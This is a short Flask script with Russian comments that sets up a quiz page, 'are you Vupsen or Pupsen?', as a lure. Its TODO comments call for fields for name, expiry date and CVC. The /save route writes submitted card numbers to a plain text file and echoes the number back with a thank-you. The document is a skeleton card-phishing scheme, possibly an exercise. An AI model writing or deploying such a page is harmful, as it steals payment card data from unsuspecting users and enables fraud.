from flask import Flask, render_template, request

# pip3 install flask

app = Flask(__name__)

@app.route('/')
def index():
    # вернуть страницу с тестом
    # добавить в форму поля ИМЯ, дата, CVC
    return render_template('page.html')
@app.route('/save', methods=['GET','POST'])
def save():
    number = request.form['number']
    # добавить сохранение данных в файл
    # сказать пользователю кто он - Вупсень или Пупсень? (сделать шаблон)
    file= open("data.txt","a")
    file.write(number+"\n")
    file.close()
    return "Номер вашей карты - {}, спасибо!".format(number)

# запускаем сайт
app.run(debug=True,port=8080)